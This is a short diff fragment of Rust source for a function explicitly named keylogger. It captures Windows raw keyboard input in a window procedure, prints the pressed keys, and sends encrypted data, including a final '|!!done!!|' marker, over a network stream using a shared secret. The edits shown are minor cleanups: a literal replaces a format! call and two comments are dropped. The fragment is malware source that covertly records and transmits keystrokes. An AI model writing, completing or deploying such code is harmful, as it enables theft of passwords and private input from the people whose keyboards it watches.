@@ -280,7 +280,7 @@ pub fn keylogger(
             if let Some(handle) = THREAD_HANDLE.lock().unwrap().take() {
                 handle.join().unwrap();
             }
-            let message = format!("|!!done!!|");
+            let message = "|!!done!!|";
             let encrypted_data =
                 encrypt(message.as_bytes(), shared_secret).expect("Failed to encrypt");
             stream
@@ -313,7 +313,6 @@ extern "C" fn wnd_proc(wnd: HWnd, message: u32, wparam: WParam, lparam: LParam) 
                 Err(_) => return 0,
             };
 
-            // print!("{:?}, ", raw_input.header);
             if let Some(keyboard) = raw_input.keyboard() {
                 if keyboard.message == WM_KEYDOWN {
                     return 0;
@@ -321,7 +320,6 @@ extern "C" fn wnd_proc(wnd: HWnd, message: u32, wparam: WParam, lparam: LParam) 
                 let key = keyboard.key();
                 println!("Pressed '{}'", key);
 
-                // Access the stream and shared_secret
                 if let (Some(ref mut stream), Some(ref shared_secret)) = (
                     &mut *STREAM.lock().unwrap(),
                     &*SHARED_SECRET.lock().unwrap(),
